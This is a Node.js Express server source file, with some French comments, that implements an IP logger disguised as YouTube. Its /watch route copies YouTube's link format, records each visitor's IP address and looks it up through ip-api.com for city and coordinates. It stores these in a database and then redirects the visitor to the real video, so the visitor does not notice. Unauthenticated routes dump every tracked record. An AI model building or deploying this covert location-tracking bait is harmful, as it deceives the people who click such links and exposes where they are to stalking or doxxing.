const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;
const DB_PATH = path.resolve(process.env.RENDER_VOLUME_PATH || '.', 'database', 'iplogger.db');
console.log('\x1b[36m%s\x1b[0m', `Using database at: ${DB_PATH}`);

// Ensure database directory exists
const dbDir = path.dirname(DB_PATH);
if (!require('fs').existsSync(dbDir)) {
    require('fs').mkdirSync(dbDir, { recursive: true });
    console.log('\x1b[32m%s\x1b[0m', 'Created database directory');
}

// Add CORS headers for development
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
    next();
});

// Initialize database
const db = new sqlite3.Database(DB_PATH, (err) => {
    if (err) {
        console.error('\x1b[31m%s\x1b[0m', `Database initialization error: ${err}`);
    } else {
        console.log('\x1b[32m%s\x1b[0m', 'Connected to database successfully');
        
        // Create table if not exists
        db.run(`
            CREATE TABLE IF NOT EXISTS tracked_ips (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT NOT NULL,
                country TEXT,
                city TEXT,
                latitude REAL,
                longitude REAL,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);
    }
});

// Middleware to get real IP
app.use((req, res, next) => {
    req.realIp = req.headers['x-forwarded-for'] || 
                 req.connection.remoteAddress || 
                 req.socket.remoteAddress;
    next();
});

// Watch route that mimics YouTube
app.get('/watch', async (req, res) => {
    try {
        const videoId = req.query.v;
        if (!videoId) {
            return res.redirect('https://youtube.com');
        }

        // Get real IP
        let ip = req.realIp.replace('::ffff:', '');  // Clean IPv6 prefix if present
        console.log('\x1b[36m%s\x1b[0m', `New visit from IP: ${ip}`);

        // Pour les tests locaux, utilisons une IP publique fictive
        if (ip === '::1' || ip === '127.0.0.1') {
            ip = '8.8.8.8'; // IP de Google DNS pour les tests
            console.log('\x1b[33m%s\x1b[0m', `Local IP detected, using test IP: ${ip}`);
        }

        // Get IP info
        const ipInfo = await axios.get(`http://ip-api.com/json/${ip}`);
        
        // Store in database
        if (ipInfo.data.status === 'success') {
            console.log('\x1b[32m%s\x1b[0m', `Location found: ${ipInfo.data.city}, ${ipInfo.data.country}`);
            
            db.run(`
                INSERT INTO tracked_ips (ip, country, city, latitude, longitude)
                VALUES (?, ?, ?, ?, ?)
            `, [
                ip,
                ipInfo.data.country,
                ipInfo.data.city,
                ipInfo.data.lat,
                ipInfo.data.lon
            ], (err) => {
                if (err) {
                    console.error('\x1b[31m%s\x1b[0m', `Database error: ${err}`);
                } else {
                    console.log('\x1b[32m%s\x1b[0m', 'IP data stored successfully');
                }
            });
        } else {
            console.error('\x1b[31m%s\x1b[0m', `IP API returned error status: ${ipInfo.data.message}`);
        }

        // Redirect to actual YouTube video
        res.redirect(`https://youtube.com/watch?v=${videoId}`);

    } catch (error) {
        console.error('\x1b[31m%s\x1b[0m', `Error processing request: ${error}`);
        res.redirect('https://youtube.com');
    }
});

// Ajoutez cette route après la route /watch
app.get('/check-db', (req, res) => {
    db.all("SELECT * FROM tracked_ips", [], (err, rows) => {
        if (err) {
            console.error('\x1b[31m%s\x1b[0m', `Database query error: ${err}`);
            res.status(500).json({ error: err.message });
            return;
        }
        console.log('\x1b[32m%s\x1b[0m', `Found ${rows.length} entries in database`);
        console.log(rows);
        res.json(rows);
    });
});

// Modifiez la route API pour ajouter plus de logs
app.get('/api/tracked-ips', (req, res) => {
    console.log('\x1b[36m%s\x1b[0m', `API request received from: ${req.ip}`);
    
    db.all("SELECT * FROM tracked_ips ORDER BY timestamp DESC", [], (err, rows) => {
        if (err) {
            console.error('\x1b[31m%s\x1b[0m', `Database query error: ${err}`);
            res.status(500).json({ error: err.message });
            return;
        }
        console.log('\x1b[32m%s\x1b[0m', `API: Found ${rows.length} entries in database`);
        console.log('\x1b[32m%s\x1b[0m', `API: Sending data:`, rows);
        res.json(rows);
    });
});

// Ajoutez une route de test simple
app.get('/api/test', (req, res) => {
    res.json({ status: 'ok', message: 'API is working' });
});

// Start server
app.listen(PORT, () => {
    console.log('\x1b[32m%s\x1b[0m', `Server running on port ${PORT}`);
}); 